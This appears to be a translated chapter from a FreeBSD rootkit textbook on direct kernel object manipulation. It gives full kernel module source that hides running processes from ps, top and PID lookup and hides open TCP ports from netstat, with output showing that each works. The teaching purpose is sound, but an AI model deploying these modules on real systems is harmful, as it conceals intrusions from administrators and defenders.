# 第三章。直接内核对象操作

所有操作系统都在主内存中存储内部记录数据，通常作为对象——即结构、队列等。每次您向内核请求运行进程列表、打开端口等时，这些数据都会被解析并返回。因为此数据存储在主内存中，可以直接操作；无需安装调用钩子来重定向控制流。这种技术通常被称为 *直接内核对象操作（DKOM）*（Hoglund 和 Butler，2005）。

在我深入这个主题之前，让我们看看在 FreeBSD 系统中内核数据是如何存储的。

# 内核队列数据结构

通常，许多有趣的信息以 *队列数据结构*（也称为 *列表*）的形式存储在内核中。一个例子是已加载的链接器文件列表；另一个是已加载的内核模块列表。

头文件 `<sys/queue.h>` 定义了四种不同类型的队列数据结构：单链表、单链表尾队列、双链表和双链表尾队列。此文件还包含 61 个宏，用于声明和操作这些结构。

以下五个宏是双链表 DKOM 的基础。

### 注意

由于这些宏与下面显示的宏在效果上相同，因此不讨论用于操作单链表、单链表尾队列和双链表尾队列的宏。有关这些宏的使用方法，请参阅 queue(3)手册页。

## LIST_HEAD 宏

双链表由 `LIST_HEAD` 宏定义的结构引导。该结构包含指向列表第一个元素的单一指针。元素是双链连接的，这样就可以在不遍历列表的情况下删除任意元素。可以在现有元素之前、之后或在列表头部添加新元素。

以下是 `LIST_HEAD` 宏的定义：

```
#define LIST_HEAD(name, type)                                           \
struct name {                                                           \
        struct type *lh_first;  /* first element */                     \
}

```

在此定义中，`name` 是要定义的结构名称，而 `type` 指定了要链接到列表中的元素类型。

如果将 `LIST_HEAD` 结构声明如下：

```
LIST_HEAD(HEADNAME, TYPE) head;

```

然后，可以声明列表头的指针：

```
struct HEADNAME *headp;

```

## LIST_HEAD_INITIALIZER 宏

双链表的头由 `LIST_HEAD_INITIALIZER` 宏初始化。

```
#define LIST_HEAD_INITIALIZER(head)                                     \
        { NULL }

```

## LIST_ENTRY 宏

`LIST_ENTRY` 宏声明了一个结构，用于连接双链表中的元素。

```
#define LIST_ENTRY(type)                                                \
struct {                                                                \
        struct type *le_next;   /* next element */                      \
        struct type **le_prev;  /* address of previous element */       \
}

```

这个结构在插入、删除和遍历列表时被引用。

## LIST_FOREACH 宏

使用 `LIST_FOREACH` 宏遍历双链表。

```
#define LIST_FOREACH(var, head, field)                                  \
        for ((var) = LIST_FIRST((head));                                \
            (var);                                                      \
            (var) = LIST_NEXT((var), field))

```

此宏以正向方向遍历由 `head` 指向的列表，依次将每个元素赋值给 `var`。`field` 参数包含使用 `LIST_ENTRY` 宏声明的结构。

## LIST_REMOVE 宏

使用 `LIST_REMOVE` 宏将双链表上的元素解耦。

```
#define LIST_REMOVE(elm, field) do {                                    \
        if (LIST_NEXT((elm), field) != NULL)                            \
                LIST_NEXT((elm), field)->field.le_prev =             \
                    (elm)->field.le_prev;                            \
        *(elm)->field.le_prev = LIST_NEXT((elm), field);             \
} while (0)

```

这里，`elm`是要删除的元素，而`field`包含使用`LIST_ENTRY`宏声明的结构。

# 同步问题

正如你很快就会看到的，你可以通过操作各种内核队列数据结构来改变内核对操作系统状态的感知。然而，仅仅通过遍历和/或修改这些对象（由于可抢占性）就有损坏系统的风险；也就是说，如果你的代码被中断，而另一个线程访问或操作你正在操作的同一些对象，可能会导致数据损坏。此外，在对称多处理（SMP）中，抢占甚至不是必要的；如果你的代码在一个 CPU 上运行，而另一个 CPU 上的另一个线程正在操作同一个对象，也可能发生数据损坏。

为了安全地操作内核队列数据结构——即为了确保线程同步——你的代码应该首先获取适当的锁（即资源访问控制）。在我们的示例中，这将要么是互斥锁，要么是共享/独占锁。

## mtx_lock 函数

*互斥锁*为一个或多个数据对象提供互斥访问，并且是线程同步的主要方法。

内核线程通过调用`mtx_lock`函数来获取互斥锁。

```
#include <sys/param.h>
#include <sys/lock.h>
#include <sys/mutex.h>

void
mtx_lock(struct mtx *mutex);

```

如果另一个线程当前持有互斥锁，调用者将休眠，直到互斥锁可用。

## mtx_unlock 函数

通过调用`mtx_unlock`函数来释放互斥锁。

```
#include <sys/param.h>
#include <sys/lock.h>
#include <sys/mutex.h>

void
mtx_unlock(struct mtx *mutex);

```

如果一个高优先级的线程正在等待互斥锁，释放锁的线程可能会被抢占，以便高优先级的线程可以获取互斥锁并运行。

### 注意

关于互斥锁的更多信息，请参阅 mutex(9)手册页面。

## sx_slock 和 sx_xlock 函数

*共享/独占锁*（也称为*sx 锁*）是一种简单的读写锁，可以在睡眠期间持有。正如其名称所暗示的，多个线程可以持有共享锁，但只有一个线程可以持有独占锁。此外，如果一个线程持有独占锁，则没有其他线程可以持有共享锁。

线程通过调用`sx_slock`或`sx_xlock`函数分别获取共享或独占锁。

```
#include <sys/param.h>
#include <sys/lock.h>
#include <sys/sx.h>
void
sx_slock(struct sx *sx);

void
sx_xlock(struct sx *sx);

```

## sx_sunlock 和 sx_xunlock 函数

要释放共享或独占锁，分别调用`sx_sunlock`或`sx_xunlock`函数。

```
#include <sys/param.h>
#include <sys/lock.h>
#include <sys/sx.h>

void
sx_sunlock(struct sx *sx);

void
sx_xunlock(struct sx *sx);

```

### 注意

关于共享/独占锁的更多信息，请参阅 sx(9)手册页面。

# 隐藏一个正在运行的过程

现在，有了前面几节中的宏和函数，我将详细说明如何使用 DKOM 隐藏一个正在运行的过程。不过，首先我们需要一些关于进程管理的背景信息。

## proc 结构

在 FreeBSD 中，每个进程的上下文都保存在一个`proc`结构中，该结构在`<sys/proc.h>`头文件中定义。以下列表描述了`struct proc`中你需要了解的字段，以便隐藏一个正在运行的过程。

### 注意

我尽量使这个列表简短，以便它可以作为参考。你可以在第一次阅读时跳过这个列表，在你遇到一些真实的 C 代码时再查阅它。

**`LIST_ENTRY(proc) p_list;`**

该字段包含与 `proc` 结构相关联的链接指针，该结构存储在 `allproc` 或 `zombproc` 列表中（在全进程列表中讨论）。在插入、删除和遍历任一列表时都会引用此字段。

**`int p_flag;`**

这些是在运行进程上设置的进程标志，例如 `P_WEXIT`、`P_EXEC` 等。所有标志都在 `<sys/proc.h>` 头文件中定义。

**`enum { PRS_NEW = 0, PRS_NORMAL, PRS_ZOMBIE } p_state;`**

该字段表示当前进程状态，其中 `PRS_NEW` 表示一个新出生但未完全初始化的进程，`PRS_NORMAL` 表示一个“活动”进程，而 `PRS_ZOMBIE` 表示一个僵尸进程。

**`pid_t p_pid;`**

这是进程标识符（PID），它是一个 32 位的整数值。

**`LIST_ENTRY(proc) p_hash;`**

该字段包含与 `proc` 结构相关联的链接指针，该结构存储在 `pidhashtbl` 中（在 pidhashtbl 中讨论）。在插入、删除和遍历 `pidhashtbl` 时会引用此字段。

**`struct mtx p_mtx;`**

这是与 `proc` 结构相关联的资源访问控制。头文件 `<sys/proc.h>` 定义了两个宏，`PROC_LOCK` 和 `PROC_UNLOCK`，以便方便地获取和释放此锁。

```
#define PROC_LOCK(p)    mtx_lock(&(p)->p_mtx)
#define PROC_UNLOCK(p)  mtx_unlock(&(p)->p_mtx)

```

**`struct vmspace *p_vmspace;`**

这是进程的虚拟内存状态，包括机器相关和机器无关的数据结构，以及统计数据。

**`char p_comm[MAXCOMLEN + 1];`**

这是用于执行进程的名称或命令。常量 `MAXCOMLEN` 在 `<sys/param.h>` 头文件中定义如下：

```
#define MAXCOMLEN       19              /* max command name remembered */

```

## 全进程列表

FreeBSD 将其 `proc` 结构组织成两个列表。所有处于 `ZOMBIE` 状态的进程都位于 `zombproc` 列表中；其余的都在 `allproc` 列表中。此列表通过间接方式被 `ps(1)`、`top(1)` 和其他报告工具引用，以列出系统上的运行进程。因此，您只需从 `allproc` 列表中删除其 `proc` 结构，就可以隐藏一个运行进程。

### 备注

自然地，人们可能会认为，通过从 `allproc` 列表中删除 `proc` 结构，相关的进程将不会执行。在过去，一些作者和黑客表示，修改 `allproc` 将会非常复杂，因为它用于进程调度和其他重要系统任务。然而，由于进程现在是在线程粒度上执行的，这种情况已经不再适用了。

`allproc` 列表在 `<sys/proc.h>` 头文件中定义如下：

```
extern struct proclist allproc;         /* list of all processes */

```

注意，`allproc` 被声明为 `proclist` 结构，该结构在 `<sys/proc.h>` 头文件中定义如下：

```
LIST_HEAD(proclist, proc);

```

从这些列表中，您可以看到 `allproc` 仅仅是一个内核队列数据结构——一个 `proc` 结构的 双向链表，更确切地说。

以下是从`<sys/proc.h>`中摘录的与`allproc`列表相关的资源访问控制。

```
extern struct sx allproc_lock;

```

## 示例

列表 3-1 显示了一个系统调用模块，该模块通过从`allproc`列表中删除其`proc`结构（s）来隐藏一个正在运行的过程。系统调用用一个参数调用：一个包含要隐藏的进程名称的字符指针（即字符串）。

```
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>

struct process_hiding_args {
        char *p_comm;           /* process name */
};

/* System call to hide a running process. */
static int
process_hiding(struct thread *td, void *syscall_args)
{
        struct process_hiding_args *uap;
        uap = (struct process_hiding_args *)syscall_args;

        struct proc *p;

        ❶sx_xlock(&allproc_lock);

        /* Iterate through the allproc list. */
        LIST_FOREACH(p, &allproc, p_list) {
                 ❷PROC_LOCK(p);

                 ❸if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
                               PROC_UNLOCK(p);
                               continue;
                }

                /* Do we want to hide this process? */
                ❹if (strncmp(p->p_comm, uap->p_comm, MAXCOMLEN) == 0)
                               ❺LIST_REMOVE(p, p_list);

                ❻PROC_UNLOCK(p);

        }

        ❼sx_xunlock(&allproc_lock);

        return(0);

}

/* The sysent for the new system call. */
static struct sysent process_hiding_sysent = {
        1,                      /* number of arguments */
        process_hiding          /* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{

        int error = 0;

        switch (cmd) {
        case MOD_LOAD:
                uprintf("System call loaded at offset %d.\n", offset);
                break;

        case MOD_UNLOAD:
                uprintf("System call unloaded from offset %d.\n", offset);
                break;

        default:
                error = EOPNOTSUPP;
                break;
        }

        return(error);

}

SYSCALL_MODULE(process_hiding, &offset, &process_hiding_sysent, load, NULL);

```

*列表 3-1：process_hiding.c*

注意我如何在检查之前❶锁定`allproc`列表和❷每个`proc`结构，以确保线程同步——用通俗的话说，为了避免内核恐慌。当然，我在完成后也会❻❺释放每个锁。

关于`process_hiding`的一个有趣细节是，在❹过程名称比较之前，我❸检查每个进程的虚拟地址空间和进程标志。如果前者不存在或后者设置为“正在退出”，则`proc`结构将解锁并跳过。隐藏一个不会运行的过程有什么意义呢？

另一个值得注意的细节是，在我❺从`allproc`列表中删除用户指定的`proc`结构之后，我没有强制立即退出`for`循环。也就是说，没有`break`语句。为什么这样做，考虑一个已经复制或分叉了自己的进程，以便父进程和子进程可以同时执行不同代码段的情况。（这是网络服务器，如`httpd`中的一种流行做法。）在这种情况下，向系统请求运行进程列表将返回父进程和子进程，因为每个子进程都在`allproc`列表上有一个单独的条目。因此，为了隐藏单个进程的每个实例，你需要遍历`allproc`列表的整个内容。

以下输出显示了`process_hiding`的实际操作：

```
$ `sudo kldload ./process_hiding.ko`
System call loaded at offset 210.
$ `ps`
  PID  TT  STAT      TIME COMMAND
  530  v1  S      0:00.21 -bash (bash)
  579  v1  R+     0:00.02 ps
  502  v2  I      0:00.42 -bash (bash)
  529  v2  S+     0:02.52 top
$ `perl -e '$p_comm = "top";' -e 'syscall(210, $p_comm);'`
$ `ps`
  PID  TT  STAT      TIME COMMAND
  530  v1  S      0:00.26 -bash (bash)
  584  v1  R+     0:00.02 ps
  502  v2  I      0:00.42 -bash (bash)

```

注意我能够从`ps(1)`的输出中隐藏`top(1)`。为了好玩，让我们从`top(1)`的角度来看，如下所示，以前后对比的方式。

```
last pid:   582;  load averages:  0.00,  0.03,  0.04    up 0+00:19:08  03:46:
❶20 processes:  1 running, 19 sleeping
CPU states:  0.0% user,  0.0% nice,  0.3% system, 14.1% interrupt, 85.5% idle
Mem: 6932K Active, 10M Inact, 14M Wired, 28K Cache, 10M Buf, 463M Free
Swap: 512M Total, 512M Free

  PID USERNAME  THR PRI NICE   SIZE    RES STATE    TIME   WCPU COMMAND
  ❷529 ghost       1  96    0  2304K  1584K RUN      0:03  0.00% top
  502 ghost       1   8    0  3276K  2036K wait     0:00  0.00% bash
  486 root        1   8    0  1616K  1280K wait     0:00  0.00% login
  485 root        1   8    0  1616K  1316K wait     0:00  0.00% login
  530 ghost       1   5    0  3276K  2164K ttyin    0:00  0.00% bash
  297 root        1  96    0  1292K   868K select   0:00  0.00% syslogd
  408 root        1  96    0  3412K  2656K select   0:00  0.00% sendmail
  424 root        1   8    0  1312K  1032K nanslp   0:00  0.00% cron
  490 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  489 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  484 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  487 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  488 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  491 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  197 root        1 110    0  1384K  1036K select   0:00  0.00% dhclient
  527 root        1  96    0  1380K  1084K select   0:00  0.00% inetd
  412 smmsp       1  20    0  3300K  2664K pause    0:00  0.00% sendmail

. . .

last pid:   584;  load averages:  0.00,  0.03,  0.03    up 0+00:20:43  03:48:
❸19 processes:  19 sleeping
CPU states:  0.0% user,  0.0% nice,  0.7% system, 11.8% interrupt, 87.5% idle
Mem: 7068K Active, 11M Inact, 14M Wired, 36K Cache, 10M Buf, 462M Free
Swap: 512M Total, 512M Free

  PID USERNAME  THR PRI NICE   SIZE    RES STATE    TIME   WCPU COMMAND
  502 ghost       1   8    0  3276K  2036K wait     0:00  0.00% bash
  486 root        1   8    0  1616K  1280K wait     0:00  0.00% login
  485 root        1   8    0  1616K  1316K wait     0:00  0.00% login
  530 ghost       1   5    0  3276K  2164K ttyin    0:00  0.00% bash
  297 root        1  96    0  1292K   868K select   0:00  0.00% syslogd
  408 root        1  96    0  3412K  2656K select   0:00  0.00% sendmail
  424 root        1   8    0  1312K  1032K nanslp   0:00  0.00% cron
  490 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  489 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  484 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  487 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  488 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  491 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty
  197 root        1 110    0  1384K  1036K select   0:00  0.00% dhclient
  527 root        1  96    0  1380K  1084K select   0:00  0.00% inetd
  412 smmsp       1  20    0  3300K  2664K pause    0:00  0.00% sendmail
  217 _dhcp       1  96    0  1384K  1084K select   0:00  0.00% dhclient

```

注意在“之前”部分，`top(1)`报告了❶一个正在运行的过程，❷自身，而在“之后”部分，它报告了❸零个正在运行的过程——尽管它显然仍在运行……/me 微笑。

# 再次注意隐藏正在运行的过程

当然，进程管理不仅涉及`allproc`和`zombproc`列表，因此隐藏一个正在运行的过程也不仅仅是操作`allproc`列表。例如：

```
$ `sudo kldload ./process_hiding.ko`
System call loaded at offset 210.
$ `ps`
  PID  TT  STAT      TIME COMMAND
  521  v1  S      0:00.19 -bash (bash)
  524  v1  R+     0:00.03 ps
  519  v2  I      0:00.17 -bash (bash)
  520  v2  S+     0:00.25 top
$ `perl -e '$p_comm = "top";' -e 'syscall(210, $p_comm);'`
$ `ps -p 520`
  PID  TT  STAT      TIME COMMAND
  520  v2  S+     0:00.56 top

```

注意隐藏的过程（`top`）是通过其 PID 找到的。毫无疑问，我将解决这个问题。但首先，需要一些关于 FreeBSD 哈希表的背景信息^([1])。

## `hashinit`函数

在 FreeBSD 中，一个*哈希表*是由`LIST_HEAD`条目组成的连续数组，它通过调用`hashinit`函数进行初始化。

```
#include <sys/malloc.h>
#include <sys/systm.h>
#include <sys/queue.h>

void *
hashinit(int nelements, struct malloc_type *type, u_long *hashmask);

```

此函数为大小为`nelements`的哈希表分配空间。如果成功，则返回分配的哈希表的指针，并将位掩码（在哈希函数中使用）设置在`hashmask`中。

## pidhashtbl

为了提高效率，除了存储在`allproc`列表中之外，所有正在运行的过程还存储在一个名为`pidhashtbl`的哈希表中。这个哈希表用于通过 PID 比在`allproc`列表中进行 O(*n*)遍历（即，线性搜索）更快地定位`proc`结构。这就是本节开头通过 PID 找到隐藏过程的方式。

`pidhashtbl`在`<sys/proc.h>`头文件中定义如下：

```
extern LIST_HEAD(pidhashhead, proc) *pidhashtbl;

```

它在文件/sys/kern/kern_proc.c 中初始化为：

```
pidhashtbl = hashinit(maxproc / 4, M_PROC, &pidhash);

```

## pfind 函数

要通过`pidhashtbl`定位一个进程，内核线程调用`pfind`函数。此函数在文件/sys/kern/kern_proc.c 中实现如下：

```
struct proc *
pfind(pid)
        register pid_t pid;
{
        register struct proc *p;

        ❶sx_slock(&allproc_lock);
        LIST_FOREACH(p, ❷PIDHASH(pid), p_hash)
                if (p->p_pid == pid) {
                        if (p->p_state == PRS_NEW) {
                                p = NULL;
                                break;
                        }
                        PROC_LOCK(p);
                        break;
                }
        sx_sunlock(&allproc_lock);
        return (p);
}

```

注意，`pidhashtbl`的资源访问控制是❶ `allproc_lock`——与`allproc`列表关联的相同锁。这是因为`allproc`和`pidhashtbl`被设计成同步的。

注意，`pidhashtbl`是通过❷ `PIDHASH`宏遍历的。此宏在`<sys/proc.h>`头文件中定义如下：

```
#define PIDHASH(pid)    (&pidhashtbl[(pid) & pidhash])

```

如你所见，`PIDHASH`是`pidhashtbl`的宏替换；具体来说，它是哈希函数。

## 示例

在下面的列表中，我将`process_hiding`修改为通过 PID 保护正在运行的过程不被发现，修改内容以粗体显示。

```
static int
process_hiding(struct thread *td, void *syscall_args)
{
        struct process_hiding_args *uap;
        uap = (struct process_hiding_args *)syscall_args;

        struct proc *p;

        sx_xlock(&allproc_lock);

        /* Iterate through the allproc list. */
        LIST_FOREACH(p, &allproc, p_list) {
                PROC_LOCK(p);

                if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
                        PROC_UNLOCK(p);
                        continue;
                }

                /* Do we want to hide this process? */
                if (strncmp(p->p_comm, uap->p_comm, MAXCOMLEN) == 0) `{`
                        LIST_REMOVE(p, p_list);
                        `LIST_REMOVE(p, p_hash);                 }`

                PROC_UNLOCK(p);
        }

        sx_xunlock(&allproc_lock);

        return(0);

}

```

如你所见，我所做的只是从`pidhashtbl`中移除了`proc`结构。简单，对吧？

列表 3-2 是另一种方法，它利用了你对`pidhashtbl`的了解。

```
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>

struct process_hiding_args {
        pid_t p_pid;            /* process identifier */
};

/* System call to hide a running process. */
static int
process_hiding(struct thread *td, void *syscall_args)
{
        struct process_hiding_args *uap;
        uap = (struct process_hiding_args *)syscall_args;

        struct proc *p;

        sx_xlock(&allproc_lock);

        /* Iterate through pidhashtbl. */
        LIST_FOREACH(p, PIDHASH(uap->p_pid), p_hash)
		if (p->p_pid == uap->p_pid) {
                        if (p->p_state == PRS_NEW) {
                                p = NULL;
                                break;
                        }
                        PROC_LOCK(p);

                        /* Hide this process. */
                        LIST_REMOVE(p, p_list);
                        LIST_REMOVE(p, p_hash);

                        PROC_UNLOCK(p);

                        break;
                }

        sx_xunlock(&allproc_lock);

        return(0);
}

/* The sysent for the new system call. */
static struct sysent process_hiding_sysent = {
        1,                      /* number of arguments */
        process_hiding          /* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{

        int error = 0;

        switch (cmd) {
        case MOD_LOAD:
                uprintf("System call loaded at offset %d.\n", offset);
                break;

        case MOD_UNLOAD:
                uprintf("System call unloaded from offset %d.\n", offset);
                break;

        default:
                error = EOPNOTSUPP;
                break;
        }

        return(error);

}

SYSCALL_MODULE(process_hiding, &offset, &process_hiding_sysent, load, NULL);

```

*列表 3-2：process_hiding_redux.c*

如你所见，`process_hiding`已被重写以使用 PID（而不是名称），这样你就可以选择遍历`pidhashtbl`而不是遍历`allproc`。这应该会减少总的运行时间。

这里有一些示例输出：

```
$ `sudo kldload ./process_hiding_redux.ko`
System call loaded at offset 210.
$ `ps`
  PID  TT  STAT      TIME COMMAND
  494  v1  S      0:00.21 -bash (bash)
  502  v1  R+     0:00.02 ps
  492  v2  I      0:00.17 -bash (bash)
  493  v2  S+     0:00.23 top
$ `perl -e 'syscall(210, 493);'`
$ `ps`
  PID  TT  STAT      TIME COMMAND
  494  v1  S      0:00.25 -bash (bash)
  504  v1  R+     0:00.02 ps
  492  v2  I      0:00.17 -bash (bash)
$ `ps -p 493`
  PID  TT  STAT      TIME COMMAND
$ `kill -9 493`
-bash: kill: (493) - No such process

```

到目前为止，除非有人正在积极搜索你的隐藏进程，否则你应该不会被发现。然而，请记住，内核中仍然有一些数据结构引用了各种运行中的进程，这意味着你的隐藏进程仍然可能被检测到——而且相当容易！

* * *

^([1]) ¹ 通常，*哈希表*是一种数据结构，其中键通过哈希函数映射到数组位置。哈希表的目的在于提供快速高效的数据检索。也就是说，给定一个键（例如，一个人的名字），你可以轻松地找到相应的值（例如，这个人的电话号码）。这是通过使用哈希函数将键转换为一个表示数组中偏移量的数字来实现的，该数组包含所需值。

# 使用 DKOM 隐藏

正如你所见，在隐藏带有 DKOM 的对象时，主要的挑战是移除内核中所有对你的对象的引用。最好的方法是查看并模仿对象的终止函数（s）的源代码，这些函数旨在移除对象的所有引用。例如，为了识别所有引用正在运行进程的数据结构，请参考 `_exit(2)` 系统调用函数，该函数在文件 /sys/kern/kern_exit.c 中实现。

### 注意

由于整理不熟悉的内核代码永远不会又快又容易，我在首次讨论隐藏正在运行的过程时，并没有在 隐藏一个正在运行的过程 的开头就列出 *`_exit(2)`* 的源代码。

在这个阶段，你应该已经了解足够的信息，可以自己执行 `_exit(2)`。尽管如此，以下是你需要修补的剩余对象，以便隐藏一个正在运行的过程：

+   父进程的子进程列表

+   父进程的进程组列表

+   `nprocs` 变量

# 隐藏一个打开的基于 TCP 的端口

由于没有关于 rootkits 的书籍不讨论如何隐藏一个打开的基于 TCP 的端口，这间接隐藏了一个建立的基于 TCP 的连接，因此我将在这里使用 DKOM 展示一个示例。不过，首先我们需要一些关于互联网协议数据结构的背景信息。

## inpcb 结构

对于每个基于 TCP 或 UDP 的套接字，都会创建一个 `inpcb` 结构，称为 *互联网协议控制块*，用于存储诸如网络地址、端口号、路由信息等互联网数据（McKusick 和 Neville-Neil，2004）。此结构在 `<netinet/in_pcb.h>` 头文件中定义。以下列表描述了 `struct inpcb` 中的字段，你需要了解这些字段才能隐藏一个打开的 TCP 端口。

### 注意

如前所述，你可以在第一次阅读时跳过此列表，并在处理一些真实的 C 代码时返回。

**`LIST_ENTRY(inpcb) inp_list;`**

此字段包含与 `inpcb` 结构关联的链接指针，该结构存储在 `tcbinfo.listhead` 列表中（在 The tcbinfo.listhead List 中讨论）。在插入、删除和遍历此列表时引用此字段。

**`struct in_conninfo inp_inc;`**

此结构维护已建立连接中的套接字对 4 元组；即本地 IP 地址、本地端口号、外方 IP 地址和外方端口号。`struct in_conninfo` 的定义可以在 `<netinet/in_pcb.h>` 头文件中找到，如下所示：

```
struct in_conninfo {
        u_int8_t        inc_flags;
        u_int8_t        inc_len;
        u_int16_t       inc_pad;
        /* protocol dependent part */
        struct  in_endpoints inc_ie;
};

```

| 在 `in_conninfo` 结构中，套接字对 4 元组存储在最后一个成员 `inc_ie` 中。这可以通过在 `<netinet/in_pcb.h>` 头文件中查找 `struct in_endpoints` 的定义来验证，如下所示： |
| --- |

```
struct in_endpoints {
        u_int16_t       ie_fport;               /* foreign port */
        u_int16_t       ie_lport;               /* local port */
        /* protocol dependent part, local and foreign addr */
        union {
                /* foreign host table entry */
                struct  in_addr_4in6 ie46_foreign;
                struct  in6_addr ie6_foreign;
        } ie_dependfaddr;
        union {
                /* local host table entry */
                struct  in_addr_4in6 ie46_local;
                struct  in6_addr ie6_local;
        } ie_dependladdr;
#define ie_faddr        ie_dependfaddr.ie46_foreign.ia46_addr4
#define ie_laddr        ie_dependladdr.ie46_local.ia46_addr4
#define ie6_faddr       ie_dependfaddr.ie6_foreign
#define ie6_laddr       ie_dependladdr.ie6_local
};

```

**`u_char inp_vflag;`**

此字段标识正在使用的 IP 版本以及设置在 `inpcb` 结构上的 IP 标志。所有标志都在 `<netinet/in_pcb.h>` 头文件中定义。

**`struct mtx inp_mtx;`**

这是与`inpcb`结构相关的资源访问控制。头文件`<netinet/in_pcb.h>`定义了两个宏，`INP_LOCK`和`INP_UNLOCK`，用于方便地获取和释放这个锁。

```
#define INP_LOCK(inp)           mtx_lock(&(inp)->inp_mtx)
#define INP_UNLOCK(inp)         mtx_unlock(&(inp)->inp_mtx)

```

## tcbinfo.listhead 列表

与基于 TCP 的套接字相关的`inpcb`结构被维护在 TCP 协议模块的私有双链表中。这个列表包含在`tcbinfo`中，该`tcbinfo`在`<netinet/tcp_var.h>`头文件中如下定义：

```
extern  struct inpcbinfo tcbinfo;

```

如您所见，`tcbinfo`被声明为`struct inpcbinfo`类型，该类型在`<netinet/in_pcb.h>`头文件中定义。在我继续之前，让我描述一下`struct inpcbinfo`的字段，这些字段是您为了隐藏一个基于 TCP 的开放端口而需要了解的。

**`struct inpcbhead *listhead;`**

在`tcbinfo`中，这个字段维护了与基于 TCP 的套接字相关的`inpcb`结构列表。这可以通过在`<netinet/in_pcb.h>`头文件中查找`struct inpcbhead`的定义来验证。

```
LIST_HEAD(inpcbhead, inpcb);

```

**`struct mtx ipi_mtx;`**

这是与`inpcbinfo`结构相关的资源访问控制。头文件`<netinet/in_pcb.h>`定义了四个宏，用于方便地获取和释放这个锁；您将使用以下两个：

```
#define INP_INFO_WLOCK(ipi)     mtx_lock(&(ipi)->ipi_mtx)
#define INP_INFO_WUNLOCK(ipi)   mtx_unlock(&(ipi)->ipi_mtx)

```

## 示例

到目前为止，您可能不会感到惊讶，您可以通过简单地从`tcbinfo.listhead`中移除其`inpcb`结构来隐藏一个基于 TCP 的开放端口。列表 3-3 是一个系统调用模块，专门用于执行此操作。该系统调用使用一个参数：一个包含要隐藏的本地端口的整数值。

```
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/socket.h>

#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>

struct port_hiding_args {
        u_int16_t lport;        /* local port */
};

/* System call to hide an open port. */
static int
port_hiding(struct thread *td, void *syscall_args)
{
        struct port_hiding_args *uap;
        uap = (struct port_hiding_args *)syscall_args;

        struct inpcb *inpb;

        INP_INFO_WLOCK(&tcbinfo);

        /* Iterate through the TCP-based inpcb list. */
        LIST_FOREACH(inpb, tcbinfo.listhead, inp_list) {
                ❶if (inpb->inp_vflag & INP_TIMEWAIT)
                        continue;

                INP_LOCK(inpb);

                /* Do we want to hide this local open port? */
                ❷if (uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
                        LIST_REMOVE(inpb, inp_list);

                INP_UNLOCK(inpb);

        }

        INP_INFO_WUNLOCK(&tcbinfo);

        return(0);

}

/* The sysent for the new system call. */
static struct sysent port_hiding_sysent = {
        1,                      /* number of arguments */
        port_hiding             /* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
        int error = 0;

        switch (cmd) {
        case MOD_LOAD:
                uprintf("System call loaded at offset %d.\n", offset);
                break;

        case MOD_UNLOAD:
                uprintf("System call unloaded from offset %d.\n", offset);
                break;

        default:
                error = EOPNOTSUPP;
                break;

        }

        return(error);

}

SYSCALL_MODULE(port_hiding, &offset, &port_hiding_sysent, load, NULL);

```

*列表 3-3: port_hiding.c*

关于这段代码的一个有趣细节是，在❷端口号比较之前，我❶检查每个`inpcb`结构的`inp_vflag`成员。如果发现`inpcb`处于 2MSL 等待状态，我就跳过它.^([2]) 隐藏一个即将关闭的端口有什么意义？

在以下输出中，我使用`telnet(1)`连接到远程机器，然后调用`port_hiding`来隐藏会话：

```
$ `telnet 192.168.123.107`
Trying 192.168.123.107...
Connected to 192.168.123.107.
Escape character is '^]'.
Trying SRA secure login:
User (ghost):
Password:
[ SRA accepts you ]

FreeBSD/i386 (alpha) (ttyp0)

Last login: Mon Mar 5 09:55:50 on ttyv1

$ `sudo kldload ./port_hiding.ko`
System call loaded at offset 210.
$ `netstat -anp tcp`
Active Internet connections (including servers)
Proto Recv-Q Send-Q  Local Address          Foreign Address       (state)
tcp4       0      0  192.168.123.107.23     192.168.123.153.61141 ESTABLISHED
tcp4       0      0  *.23                   *.*                   LISTEN
tcp4       0      0  127.0.0.1.25           *.*                   LISTEN
$ `perl -e 'syscall(210, 23);'`
$ `netstat -anp tcp`
Active Internet connections (including servers)
Proto Recv-Q Send-Q  Local Address          Foreign Address       (state)
tcp4       0      0  127.0.0.1.25           *.*                   LISTEN

```

注意`port_hiding`如何隐藏了本地 telnet 服务器以及连接。要改变这种行为，只需将`port_hiding`重写为需要两个参数：一个本地端口和一个本地地址。

* * *

